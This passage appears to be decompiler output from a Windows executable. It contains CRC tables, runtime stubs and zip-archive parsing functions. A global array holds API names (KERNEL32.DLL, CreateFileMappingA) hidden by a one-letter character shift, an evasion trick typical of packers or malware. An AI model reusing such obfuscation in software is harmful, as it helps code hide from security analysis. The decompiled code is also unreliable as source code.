  356276756,
  352202787,
  381193850,
  393929805,
  944588512,
  965684439,
  1003065998,
  973863097,
  1061482044,
  1049003019,
  1019230802,
  1023561829,
  912136024,
  933002607,
  903529270,
  874031361,
  827834244,
  815125939,
  852716522,
  856752605,
  611050896,
  631869351,
  669987326,
  640506825,
  593644876,
  580921211,
  551983394,
  556069653,
  712553512,
  733666847,
  704405574,
  675154545,
  762387700,
  749958851,
  787859610,
  792175277,
  1889177024,
  1901651959,
  1931368878,
  1927033753,
  2006131996,
  1985040171,
  1947726194,
  1976933189,
  2122964088,
  2135668303,
  2098006038,
  2093965857,
  2038461604,
  2017599123,
  2047123658,
  2076625661,
  1824272048,
  1836991623,
  1866005214,
  1861914857,
  1807058540,
  1786244187,
  1748062722,
  1777547317,
  1655668488,
  1668093247,
  1630251878,
  1625932113,
  1705433044,
  1684323811,
  1713505210,
  1742760333,
  1222101792,
  1226154263,
  1263738702,
  1251046777,
  1339974652,
  1310460363,
  1281013650,
  1301863845,
  1187289752,
  1191637167,
  1161842422,
  1149379777,
  1103966788,
  1074747507,
  1112139306,
  1133218845,
  1425107024,
  1429406311,
  1467333694,
  1454888457,
  1408811148,
  1379576507,
  1350309090,
  1371438805,
  1524775400,
  1528845279,
  1499917702,
  1487177649,
  1575719220,
  1546255107,
  1584350554,
  1605185389,
  -516613248,
  -520654409,
  -491663378,
  -478960167,
  -432229540,
  -402728597,
  -440899790,
  -461763323,
  -282703304,
  -287039473,
  -324886954,
  -312413087,
  -399514908,
  -370308909,
  -341100918,
  -362193731,
  -49039120,
  -53357881,
  -23630690,
  -11204951,
  -98955220,
  -69699045,
  -107035582,
  -128143755,
  -218044088,
  -222133377,
  -259769050,
  -247048431,
  -200719980,
  -171234397,
  -141715974,
  -162529331,
  -646423200,
  -658884777,
  -620984050,
  -616635591,
  -562956868,
  -541876341,
  -571137582,
  -600355867,
  -680850216,
  -693541137,
  -722478922,
  -718425471,
  -798841852,
  -777990605,
  -739872662,
  -769385891,
  -983630320,
  -996371417,
  -958780802,
  -954711991,
  -1034463540,
  -1013629701,
  -1043103070,
  -1072568171,
  -884101208,
  -896547425,
  -926319674,
  -922021391,
  -867956876,
  -846828221,
  -809446630,
  -838682323,
  -1850763712,
  -1871840137,
  -1842658770,
  -1813436391,
  -1767489892,
  -1755032405,
  -1792873742,
  -1797226299,
  -1615017992,
  -1635865137,
  -1674046570,
  -1644529247,
  -1732939996,
  -1720253165,
  -1691239606,
  -1695297155,
  -1920387792,
  -1941217529,
  -1911692962,
  -1882223767,
  -1971282452,
  -1958545445,
  -1996207742,
  -2000280651,
  -2087033720,
  -2108158273,
  -2145472282,
  -2116232495,
  -2070688684,
  -2058246557,
  -2028529606,
  -2032831987,
  -1444753248,
  -1474250089,
  -1436154674,
  -1415287047,
  -1360299908,
  -1356262837,
  -1385190382,
  -1397897691,
  -1477345000,
  -1506546897,
  -1535814282,
  -1514717375,
  -1594349116,
  -1590017037,
  -1552089686,
  -1564567651,
  -1245416496,
  -1274668569,
  -1237276738,
  -1216164471,
  -1295131892,
  -1290817221,
  -1320611998,
  -1333041835,
  -1143528856,
  -1173010337,
  -1202457082,
  -1181639631,
  -1126266188,
  -1122180989,
  -1084596518,
  -1097321235
}; // weak
int dword_430A08[256] =
{
  0,
  -1195612315,
  -1442199413,
  313896942,
  -1889364137,
  937357362,
  627793884,
  -1646839623,
  -978048785,
  2097696650,
  1874714724,
  -687765759,
  1255587768,
  -227878691,
  -522225869,
  1482887254,
  1343838111,
  -391827206,
  -99573996,
  1118632049,
  -545537848,
  1741137837,
  1970407491,
  -842109146,
  -1783791760,
  756094997,
  1067759611,
  -2028416866,
  449832999,
  -1569484990,
  -1329192788,
  142231497,
  -1607291074,
  412010587,
  171665333,
  -1299775280,
  793786473,
  -1746116852,
  -2057703198,
  1038456711,
  1703315409,
  -583343948,
  -812691622,
  1999841343,
  -354152314,
  1381529571,
  1089329165,
  -128860312,
  -265553759,
  1217896388,
  1512189994,
  -492939441,
  2135519222,
  -940242797,
  -717183107,
  1845280792,
  899665998,
  -1927039189,
  -1617553211,
  657096608,
  -1157806311,
  37822588,
  284462994,
  -1471616777,
  -1693165507,
  598228824,
  824021174,
  -1985873965,
  343330666,
  -1396004849,
  -1098971167,
  113467524,
  1587572946,
  -434366537,
  -190203815,
  1276501820,
  -775755899,
  1769898208,
  2076913422,
  -1015592853,
  -888336478,
  1941006535,
  1627703081,
  -642211764,
  1148164341,
  -53215344,
  -295284610,
  1457141531,
  247015245,
  -1241169880,
  -1531908154,
  470583459,
  -2116308966,
  963106687,
  735213713,
  -1821499404,
  992409347,
  -2087022490,
  -1859174520,
  697522413,
  -1270587308,
  217581361,
  508405983,
  -1494102086,
  -23928852,
  1177467017,
  1419450215,
  -332959742,
  1911572667,
  -917753890,
  -604405712,
  1665525589,
  1799331996,
  -746338311,
  -1053399017,
  2039091058,
  -463652917,
  1558270126,
  1314193216,
  -152528859,
  -1366587277,
  372764438,
  75645176,
  -1136777315,
  568925988,
  -1722451903,
  -1948198993,
  861712586,
  -312887749,
  1441124702,
  1196457648,
  -1304107,
  1648042348,
  -628668919,
  -936187417,
  1888390786,
  686661332,
  -1873675855,
  -2098964897,
  978858298,
  -1483798141,
  523464422,
  226935048,
  -1254447507,
  -1119821404,
  100435649,
  390670639,
  -1342878134,
  841119475,
  -1969352298,
  -1741963656,
  546822429,
  2029308235,
  -1068978642,
  -755170880,
  1782671013,
  -141140452,
  1328167289,
  1570739863,
  -450629134,
  1298864389,
  -170426784,
  -412954226,
  1608431339,
  -1039561134,
  2058742071,
  1744848601,
  -792976964,
  -1998638614,
  811816591,
  584513889,
  -1704288764,
  129869501,
  -1090403880,
  -1380684234,
  352848211,
  494030490,
  -1513215489,
  -1216641519,
  264757620,
  -1844389427,
  715964072,
  941166918,
  -2136639965,
  -658086283,
  1618608400,
  1926213374,
  -898381413,
  1470427426,
  -283601337,
  -38979159,
  1158766284,
  1984818694,
  -823031453,
  -599513459,
  1693991400,
  -114329263,
  1100160564,
  1395044826,
  -342174017,
  -1275476247,
  189112716,
  435162722,
  -1588827897,
  1016811966,
  -2077804837,
  -1768777419,
  774831696,
  643086745,
  -1628905732,
  -1940033262,
  887166583,
  -1456066866,
  294275499,
  54519365,
  -1149009632,
  -471821962,
  1532818963,
  1240029693,
  -246071656,
  1820460577,
  -734109372,
  -963916118,
  2117577167,
  -696303304,
  1858283101,
  2088143283,
  -993333546,
  1495127663,
  -509497078,
  -216785180,
  1269332353,
  332098007,
  -1418260814,
  -1178427044,
  25085497,
  -1666580864,
  605395429,
  916469259,
  -1910746770,
  -2040129881,
  1054503362,
  745528876,
  -1798063799,
  151290352,
  -1313282411,
  -1559410309,
  464596510,
  1137851976,
  -76654291,
  -371460413,
  1365741990,
  -860837601,
  1946996346,
  1723425172,
  -570095887
}; // weak
_UNKNOWN unk_431E08; // weak
_UNKNOWN unk_432608; // weak
__int16 word_432688[20] = { 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15, 0 }; // weak
_UNKNOWN unk_432970; // weak
_UNKNOWN unk_4329B0; // weak
_UNKNOWN unk_4329F0; // weak
_UNKNOWN unk_432A30; // weak
void *std::bad_alloc::`vftable' = &unknown_libname_4; // weak
void *std::logic_error::`vftable' = &unknown_libname_4; // weak
void *std::invalid_argument::`vftable' = &unknown_libname_4; // weak
void *std::length_error::`vftable' = &unknown_libname_4; // weak
void *std::out_of_range::`vftable' = &unknown_libname_4; // weak
char *const Mode = "r"; // idb
int dword_433628[] = { 1 }; // weak
int dword_43362C[14] = { 2, 18, 10, 33, 34, 50, 42, 3, 19, 11, 35, 51, 43, 0 }; // weak
void *type_info::`vftable' = &sub_41010C; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_4; // weak
void *std::bad_exception::`vftable' = &unknown_libname_4; // weak
const _ThrowInfo _TI2_AVruntime_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVruntime_error_std__ }; // idb
const _ThrowInfo _TI5_AVfailure_ios_base_std__ = { 0u, &unknown_libname_1, NULL, &_CTA5_AVfailure_ios_base_std__ }; // idb
const _ThrowInfo _TI5_AVfilesystem_error_v1_filesystem_experimental_std__ =
{
  0u,
  &sub_407720,
  NULL,
  &_CTA5_AVfilesystem_error_v1_filesystem_experimental_std__
}; // idb
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI3_AVinvalid_argument_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVinvalid_argument_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVlength_error_std__ }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVout_of_range_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
_UNKNOWN unk_440000; // weak
_UNKNOWN unk_44E9C0; // weak
_UNKNOWN unk_44F418; // weak
void *dword_500E18 = NULL; // idb
int dword_500E28 = 0; // weak
int dword_500E2C = 15; // weak
void *dword_500E30 = NULL; // idb
int dword_500E40 = 0; // weak
int dword_500E44 = 15; // weak
char *off_500E48[2] = { "LFSOFM43/EMM", "DsfbufGjmfNbqqjohB" }; // weak
int dword_508690 = 1; // weak
signed __int32 dword_508694[3] = { -1, 1, 0 }; // weak
int dword_508720 = 1; // weak
wchar_t *off_5088A8 = L"         (((((                  H"; // weak
int dword_508AA0 = -2; // weak
void *Block = &unk_508E38; // idb
int dword_509584 = 0; // idb
int dword_509588 = 0; // weak
int dword_50958C = 0; // weak
int dword_509590 = 0; // weak
_UNKNOWN unk_509594; // weak
_UNKNOWN unk_509598; // weak
_UNKNOWN unk_5095A0; // weak
_UNKNOWN unk_5095A4; // weak
_UNKNOWN unk_5095AC; // weak
_UNKNOWN unk_5095B0; // weak
int dword_5095B4 = 0; // weak
int dword_5095B8 = 0; // weak
_UNKNOWN unk_5095C0; // weak
struct _RTL_CRITICAL_SECTION CriticalSection = { NULL, 0, 0, NULL, NULL, 0u }; // idb
int dword_509688; // weak
int dword_50968C; // weak
int dword_509694; // weak
int dword_5096A8; // idb
_DWORD dword_5096AC; // weak
_UNKNOWN unk_5096B4; // weak
_UNKNOWN unk_509738; // weak
_UNKNOWN unk_509739; // weak
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_509BB0; // weak
int dword_509BB8; // weak
int dword_509C74; // weak
int dword_509DCC; // weak
void *dword_509FEC; // idb
void *dword_509FF0; // idb
int dword_509FF8; // weak
int dword_509FFC; // weak
int dword_50A000; // weak
_onexit_table_t stru_50A008; // idb
struct __crt_locale_data *dword_50A02C; // idb
LPCRITICAL_SECTION lpCriticalSection[128]; // weak
int dword_50A230; // weak
HANDLE hHeap; // idb
int dword_50A424; // weak
char byte_50A42F[]; // weak
_UNKNOWN unk_50A430; // weak
char byte_50A533[261]; // weak
_UNKNOWN unk_50A638; // weak
_UNKNOWN unk_50A644; // weak
_UNKNOWN unk_50A648; // weak
int dword_50A650; // weak
_UNKNOWN loc_50B17D; // weak
_UNKNOWN loc_50B980; // weak
_UNKNOWN loc_50BB8A; // weak
_UNKNOWN loc_50C725; // weak
_UNKNOWN loc_50CACE; // weak
_UNKNOWN loc_50CAFD; // weak
_UNKNOWN loc_50D0D6; // weak


//----- (00401000) --------------------------------------------------------
int __usercall sub_401000@<eax>(int a1@<ecx>, int a2@<edi>, int a3@<esi>, _DWORD *a4)
{
  unsigned __int8 v5; // [esp+1h] [ebp-1h]

  v5 = HIBYTE(a1);
  if ( (*(int (__stdcall **)(_DWORD))(a3 + 4))(*(_DWORD *)(a3 + 28)) != 1 )
    return -((*(int (__cdecl **)(_DWORD, int))(a3 + 24))(*(_DWORD *)(a3 + 28), a2) != 0);
  *a4 = v5;
  return 0;
}

//----- (00401040) --------------------------------------------------------
int __usercall sub_401040@<eax>(int a1@<eax>, int a2@<ecx>, int *a3)
{
  int result; // eax
  int v6; // ebx
  int v7; // [esp+Ch] [ebp-4h] BYREF

  v7 = 0;
  result = sub_401000(a2, a1, a2, &v7);
  v6 = v7;
  if ( result || (result = sub_401000((int)&v7, a1, a2, &v7)) != 0 )
    *a3 = 0;
  else
    *a3 = v6 | (v7 << 8);
  return result;
}

//----- (004010A0) --------------------------------------------------------
int __usercall sub_4010A0@<eax>(int a1@<eax>, int a2@<ecx>, _DWORD *a3)
{
  int result; // eax
  int v6; // ecx
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // [esp+Ch] [ebp-4h] BYREF

  v10 = 0;
  result = sub_401000(a2, a1, a2, &v10);
  v6 = v10;
  v7 = v10;
  if ( !result )
  {
    result = sub_401000((int)&v10, a1, a2, &v10);
    v6 = v10;
  }
  v8 = (v6 << 8) | v7;
  if ( !result )
  {
    result = sub_401000(v6, a1, a2, &v10);
    v6 = v10;
  }
  v9 = (v6 << 16) | v8;
  if ( result || (result = sub_401000((int)&v10, a1, a2, &v10)) != 0 )
    *a3 = 0;
  else
    *a3 = v9 + (v10 << 24);
  return result;
}

//----- (00401130) --------------------------------------------------------
int __usercall sub_401130@<eax>(int a1@<eax>, int a2@<ecx>, int *a3)
{
  int v5; // ecx
  __int64 v6; // kr00_8
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // edx
  int v12; // [esp+10h] [ebp-8h]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+10h] [ebp-8h]
  int v16; // [esp+10h] [ebp-8h]
  int v17; // [esp+10h] [ebp-8h]
  int v18; // [esp+14h] [ebp-4h] BYREF

  v18 = 0;
  v5 = sub_401000(a2, a1, a2, &v18);
  v6 = v18;
  if ( !v5 )
    v5 = sub_401000((int)&v18, a1, a2, &v18);
  v12 = ((unsigned __int64)v18 >> 24) | HIDWORD(v6);
  v7 = (v18 << 8) | v6;
  if ( !v5 )
    v5 = sub_401000(0, a1, a2, &v18);
  v13 = ((unsigned __int64)v18 >> 16) | v12;
  v8 = (v18 << 16) | v7;
  if ( !v5 )
    v5 = sub_401000(0, a1, a2, &v18);
  v14 = ((unsigned __int64)v18 >> 8) | v13;
  v9 = (v18 << 24) | v8;
  if ( !v5 )
    v5 = sub_401000((int)&v18, a1, a2, &v18);
  v15 = v18 | v14;
  if ( !v5 )
    v5 = sub_401000(0, a1, a2, &v18);
  v16 = (v18 << 8) | v15;
  if ( !v5 )
    v5 = sub_401000(0, a1, a2, &v18);
  v17 = (v18 << 16) | v16;
  if ( v5 || (v5 = sub_401000((int)&v18, a1, a2, &v18)) != 0 )
  {
    *a3 = 0;
    a3[1] = 0;
    return v5;
  }
  else
  {
    v10 = v17 | (v18 << 24);
    *a3 = v9;
    a3[1] = v10;
    return 0;
  }
}

//----- (004012C0) --------------------------------------------------------
int __cdecl sub_4012C0(const char *a1, const char *a2, int a3)
{
  const char *v3; // esi
  char v4; // al
  char v5; // cl

  if ( a3 == 1 )
    return strcmp(a1, a2);
  v3 = a2;
  while ( 1 )
  {
    v4 = v3[a1 - a2];
    v5 = *v3++;
    if ( (unsigned __int8)(v4 - 97) <= 0x19u )
      v4 -= 32;
    if ( (unsigned __int8)(v5 - 97) <= 0x19u )
      v5 -= 32;
    if ( !v4 )
      return -(v5 != 0);
    if ( !v5 )
      return 1;
    if ( v4 < v5 )
      break;
    if ( v4 > v5 )
      return 1;
  }
  return -1;
}

//----- (00401310) --------------------------------------------------------
unsigned __int64 __cdecl sub_401310(int a1, int a2)
{
  unsigned int v2; // esi
  unsigned __int64 v4; // rax
  unsigned int v5; // edi
  unsigned int v6; // ebx
  unsigned int v7; // ecx
  int v8; // edx
  unsigned int v9; // eax
  unsigned __int64 v10; // kr10_8
  int v11; // ebx
  int v12; // eax
  unsigned __int64 v13; // [esp+Ch] [ebp-24h]
  unsigned __int64 v14; // [esp+14h] [ebp-1Ch]
  unsigned __int64 v15; // [esp+1Ch] [ebp-14h]
  unsigned __int64 v16; // [esp+24h] [ebp-Ch]
  _BYTE *Block; // [esp+2Ch] [ebp-4h]

  v2 = 0;
  v16 = 0xFFFFi64;
  v14 = 0i64;
  if ( sub_402BD0(a1, a2, 0, 0, 2) )
    return 0i64;
  LODWORD(v4) = sub_402C30(a1, a2);
  v5 = HIDWORD(v4);
  v6 = v4;
  v13 = v4;
  if ( v4 < 0xFFFF )
  {
    v16 = v4;
    v2 = HIDWORD(v4);
  }
  Block = malloc(0x404u);
  if ( !Block )
    return 0i64;
  v7 = 0;
  v8 = 4;
  v9 = v16;
  if ( (unsigned int)v16 > 4 )
  {
    while ( 1 )
    {
      v15 = __PAIR64__(v7, v8) + 1024 <= __PAIR64__(v2, v9) ? __PAIR64__(v7, v8) + 1024 : __PAIR64__(v2, v9);
      v10 = __PAIR64__(v5, v6) - v15;
      v11 = __PAIR64__(HIDWORD(v13), v6) - (__PAIR64__(v5, v6) - v15) <= 0x404 ? v15 : 1028;
      if ( sub_402BD0(a1, a2, v10, SHIDWORD(v10), 0)
        || (*(int (__cdecl **)(_DWORD, int, _BYTE *, int))(a1 + 4))(*(_DWORD *)(a1 + 28), a2, Block, v11) != v11 )
      {
        break;
      }
      v12 = v11 - 3;
      if ( v11 - 3 > 0 )
      {
        while ( Block[--v12] != 80 || Block[v12 + 1] != 75 || Block[v12 + 2] != 5 || Block[v12 + 3] != 6 )
        {
          if ( v12 <= 0 )
            goto LABEL_25;
        }
        v14 = v10 + v12;
        if ( v14 )
          break;
      }
LABEL_25:
      if ( v15 >= v16 )
        break;
      v6 = v13;
      v2 = HIDWORD(v16);
      v7 = HIDWORD(v15);
      v8 = v15;
      v5 = HIDWORD(v13);
      v9 = v16;
    }
  }
  j___free_base(Block);
  return v14;
}
// 40139E: conditional instruction was optimized away because esi.4==0
// 401355: variable 'v4' is possibly undefined

//----- (004014B0) --------------------------------------------------------
int __cdecl sub_4014B0(int a1, int a2)
{
  int v2; // edi
  unsigned int v3; // esi
  unsigned __int64 v5; // rax
  unsigned int v6; // ebx
  unsigned int v7; // eax
  int v8; // ecx
  unsigned int v9; // edx
  unsigned __int64 v10; // kr10_8
  int v11; // ebx
  int v12; // eax
  unsigned __int64 v13; // [esp+Ch] [ebp-24h] BYREF
  unsigned __int64 v14; // [esp+14h] [ebp-1Ch]
  unsigned __int64 v15; // [esp+1Ch] [ebp-14h]
  unsigned __int64 v16; // [esp+24h] [ebp-Ch]
  void *Block; // [esp+2Ch] [ebp-4h] BYREF

  v2 = a2;
  v3 = 0;
  v16 = 0xFFFFi64;
  v14 = 0i64;
  if ( sub_402BD0(a1, a2, 0, 0, 2) )
    return 0;
  LODWORD(v5) = sub_402C30(a1, a2);
  v6 = v5;
  v13 = v5;
  if ( v5 < 0xFFFF )
  {
    v16 = v5;
    v3 = HIDWORD(v5);
  }
  Block = malloc(0x404u);
  if ( !Block )
    return 0;
  v7 = 0;
  v8 = 4;
  v9 = v16;
  if ( (unsigned int)v16 > 4 )
  {
    while ( 1 )
    {
      v15 = __PAIR64__(v7, v8) + 1024 <= __PAIR64__(v3, v9) ? __PAIR64__(v7, v8) + 1024 : __PAIR64__(v3, v9);
      v10 = __PAIR64__(HIDWORD(v13), v6) - v15;
      v11 = __PAIR64__(HIDWORD(v13), v6) - (__PAIR64__(HIDWORD(v13), v6) - v15) <= 0x404 ? v15 : 1028;
      if ( sub_402BD0(a1, a2, v10, SHIDWORD(v10), 0)
        || (*(int (__cdecl **)(_DWORD, int, void *, int))(a1 + 4))(*(_DWORD *)(a1 + 28), a2, Block, v11) != v11 )
      {
        break;
      }
      v12 = v11 - 3;
      if ( v11 - 3 > 0 )
      {
        while ( *((_BYTE *)Block + --v12) != 80
             || *((_BYTE *)Block + v12 + 1) != 75
             || *((_BYTE *)Block + v12 + 2) != 6
             || *((_BYTE *)Block + v12 + 3) != 7 )
        {
          if ( v12 <= 0 )
            goto LABEL_25;
        }
        v14 = v10 + v12;
        if ( v14 )
          break;
      }
LABEL_25:
      if ( v15 >= v16 )
        break;
      v6 = v13;
      v3 = HIDWORD(v16);
      v7 = HIDWORD(v15);
      v8 = v15;
      v9 = v16;
    }
    v2 = a2;
  }
  j___free_base(Block);
  if ( !v14
    || sub_402BD0(a1, v2, v14, SHIDWORD(v14), 0)
    || sub_4010A0(v2, a1, &Block)
    || sub_4010A0(v2, a1, &Block)
    || Block
    || sub_401130(v2, a1, (int *)&v13)
    || sub_4010A0(v2, a1, &Block)
    || Block != (void *)1
    || sub_402BD0(a1, v2, v13, SHIDWORD(v13), 0)
    || sub_4010A0(v2, a1, &Block)
    || Block != (void *)101075792 )
  {
    return 0;
  }
  else
  {
    return v13;
  }
}
// 40153C: conditional instruction was optimized away because esi.4==0
// 4014FA: variable 'v5' is possibly undefined

//----- (00401730) --------------------------------------------------------
int __cdecl sub_401730(_DWORD *a1, _DWORD *a2)
{
  if ( !a1 )
    return -102;
  *a2 = a1[14];
  a2[1] = a1[15];
  a2[2] = a1[16];
  a2[3] = a1[17];
  return 0;
}

//----- (00401760) --------------------------------------------------------
int __usercall sub_401760@<eax>(_DWORD *a1@<edx>, unsigned __int64 a2)
{
  int result; // eax

  a1[3] = BYTE2(a2) & 0x1F;
  a1[4] = ((a2 >> 21) & 0xF) - 1;
  a1[5] = ((a2 >> 25) & 0x7F) + 1980;
  a1[2] = (a2 >> 11) & 0x1F;
  result = (a2 >> 5) & 0x3F;
  a1[1] = result;
  *a1 = 2 * (a2 & 0x1F);
  return result;
}

//----- (004017E0) --------------------------------------------------------
int __usercall sub_4017E0@<eax>(
        int a1@<eax>,
        int *a2,
        _DWORD *a3,
        int a4,
        unsigned int a5,
        int a6,
        unsigned int a7,
        int a8,
        unsigned int a9)
{
  int v10; // ebx
  __int64 v12; // kr00_8
  int v13; // eax
  int v14; // eax
  int v15; // edi
  int v16; // eax
  int v17; // edi
  int v18; // eax
  bool v19; // zf
  int v20; // eax
  int v21; // edi
  unsigned int v22; // edi
  int v23; // ecx
  int v24[22]; // [esp+Ch] [ebp-74h] BYREF
  int v25; // [esp+64h] [ebp-1Ch] BYREF
  int v26; // [esp+68h] [ebp-18h]
  int v27; // [esp+6Ch] [ebp-14h] BYREF
  int v28; // [esp+70h] [ebp-10h] BYREF
  unsigned int v29; // [esp+74h] [ebp-Ch] BYREF
  int v30; // [esp+78h] [ebp-8h] BYREF
  int v31; // [esp+7Ch] [ebp-4h] BYREF

  v10 = 0;
  if ( !a1 )
    return -102;
  v12 = *(_QWORD *)(a1 + 72) + *(_QWORD *)(a1 + 88);
  if ( sub_402BD0(a1, *(_DWORD *)(a1 + 48), v12, SHIDWORD(v12), 0) )
  {
    v10 = -1;
  }
  else if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v29) )
  {
    v10 = -1;
  }
  else if ( v29 != 33639248 )
  {
    v10 = -103;
  }
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, v24) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[1]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[2]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[3]) )
    v10 = -1;
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v24[4]) )
    v10 = -1;
  sub_401760(&v24[16], (unsigned int)v24[4]);
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v24[5]) )
    v10 = -1;
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v31) )
    v10 = -1;
  v24[6] = v31;
  v13 = *(_DWORD *)(a1 + 48);
  v24[7] = 0;
  if ( sub_4010A0(v13, a1, &v31) )
    v10 = -1;
  v14 = *(_DWORD *)(a1 + 48);
  v24[8] = v31;
  v24[9] = 0;
  if ( sub_401040(v14, a1, &v24[10]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[11]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[12]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[13]) )
    v10 = -1;
  if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v24[14]) )
    v10 = -1;
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v24[15]) )
    v10 = -1;
  if ( sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v31) )
    v10 = -1;
  v26 = 0;
  v15 = v24[10];
  v25 = v31;
  v31 = v24[10];
  if ( v10 )
    goto LABEL_61;
  if ( a4 )
  {
    if ( v24[10] >= a5 )
    {
      v31 = a5;
    }
    else
    {
      *(_BYTE *)(v24[10] + a4) = 0;
      v31 = v15;
    }
    if ( v15 )
    {
      if ( a5 )
      {
        v16 = (*(int (__cdecl **)(_DWORD, _DWORD, int, int))(a1 + 4))(
                *(_DWORD *)(a1 + 28),
                *(_DWORD *)(a1 + 48),
                a4,
                v31);
        if ( v16 != v31 )
          v10 = -1;
      }
    }
    v31 = v15 - v31;
    if ( v10 )
      goto LABEL_61;
  }
  if ( !a6 )
  {
LABEL_61:
    v31 += v24[11];
    v18 = v24[11];
  }
  else
  {
    v17 = a7;
    if ( v24[11] < a7 )
      v17 = v24[11];
    if ( v31 )
    {
      if ( sub_402BD0(a1, *(_DWORD *)(a1 + 48), v31, v31 >> 31, 1) )
        v10 = -1;
      else
        v31 = 0;
    }
    if ( v24[11]
      && a7
      && (*(int (__cdecl **)(_DWORD, _DWORD, int, int))(a1 + 4))(*(_DWORD *)(a1 + 28), *(_DWORD *)(a1 + 48), a6, v17) != v17 )
    {
      v10 = -1;
    }
    v18 = v24[11];
    v31 += v24[11] - v17;
  }
  if ( !v10 )
  {
    if ( !v18 )
      goto LABEL_93;
    v19 = v31 == v18;
    v31 -= v18;
    v29 = 0;
    if ( !v19 )
    {
      if ( sub_402BD0(a1, *(_DWORD *)(a1 + 48), v31, v31 >> 31, 1) )
        v10 = -1;
      else
        v31 = 0;
    }
    if ( v24[11] )
    {
      do
      {
        if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v28) )
          v10 = -1;
        if ( sub_401040(*(_DWORD *)(a1 + 48), a1, &v30) )
          v10 = -1;
        if ( v28 == 1 )
        {
          if ( v24[8] == -1 && !v24[9] && sub_401130(*(_DWORD *)(a1 + 48), a1, &v24[8]) )
            v10 = -1;
          if ( v24[6] == -1 && !v24[7] && sub_401130(*(_DWORD *)(a1 + 48), a1, &v24[6]) )
            v10 = -1;
          if ( v25 == -1 && !v26 && sub_401130(*(_DWORD *)(a1 + 48), a1, &v25) )
            v10 = -1;
          if ( v24[13] != -1 )
            goto LABEL_91;
          v20 = sub_4010A0(*(_DWORD *)(a1 + 48), a1, &v27);
        }
        else
        {
          v20 = sub_402BD0(a1, *(_DWORD *)(a1 + 48), v30, 0, 1);
        }
        if ( v20 )
          v10 = -1;
LABEL_91:
        v29 += v30 + 4;
      }
      while ( v29 < v24[11] );
    }
    if ( !v10 )
    {
LABEL_93:
      if ( !a8 )
        goto LABEL_105;
      v21 = v24[12];
      if ( v24[12] >= a9 )
      {
        v29 = a9;
      }
      else
      {
        *(_BYTE *)(v24[12] + a8) = 0;
        v29 = v21;
      }
      if ( v31 && sub_402BD0(a1, *(_DWORD *)(a1 + 48), v31, v31 >> 31, 1) )
        v10 = -1;
      if ( v21 )
      {
        if ( a9 )
        {
          v22 = v29;
          if ( (*(int (__cdecl **)(_DWORD, _DWORD, int, unsigned int))(a1 + 4))(
                 *(_DWORD *)(a1 + 28),
                 *(_DWORD *)(a1 + 48),
                 a8,
                 v29) != v22 )
            return -1;
        }
      }
      if ( !v10 )
      {
LABEL_105:
        if ( a2 )
          qmemcpy(a2, v24, 0x58u);
        if ( a3 )
        {
          v23 = v26;
          *a3 = v25;
          a3[1] = v23;
        }
      }
    }
  }
  return v10;
}

//----- (00401C90) --------------------------------------------------------
int __cdecl sub_401C90(int a1, int *a2, int a3, unsigned int a4, int a5, unsigned int a6, int a7, unsigned int a8)
{
  return sub_4017E0(a1, a2, 0, a3, a4, a5, a6, a7, a8);
}

//----- (00401CC0) --------------------------------------------------------
int __cdecl sub_401CC0(int a1)
{
  int result; // eax
  int v2; // ecx

  if ( !a1 )
    return -102;
  v2 = *(_DWORD *)(a1 + 124);
  *(_DWORD *)(a1 + 88) = *(_DWORD *)(a1 + 120);
  *(_DWORD *)(a1 + 92) = v2;
  *(_DWORD *)(a1 + 80) = 0;
  *(_DWORD *)(a1 + 84) = 0;
  result = sub_4017E0(a1, (int *)(a1 + 128), (_DWORD *)(a1 + 216), 0, 0, 0, 0, 0, 0);
  *(_QWORD *)(a1 + 96) = result == 0;
  return result;
}

//----- (00401D30) --------------------------------------------------------
int __cdecl sub_401D30(int a1)
{
  int result; // eax
  unsigned int v2; // edx
  unsigned int v3; // edi
  int v4; // eax
  bool v5; // cf

  if ( !a1 )
    return -102;
  if ( !*(_QWORD *)(a1 + 96) )
    return -100;
  v2 = *(_DWORD *)(a1 + 56);
  v3 = *(_DWORD *)(a1 + 60);
  if ( (v2 != 0xFFFF || v3) && *(_QWORD *)(a1 + 80) + 1i64 == __PAIR64__(v3, v2) )
    return -100;
  v4 = *(_DWORD *)(a1 + 172) + *(_DWORD *)(a1 + 176) + *(_DWORD *)(a1 + 168) + 46;
  v5 = __CFADD__(v4, *(_DWORD *)(a1 + 88));
  *(_DWORD *)(a1 + 88) += v4;
  *(_DWORD *)(a1 + 92) += v5;
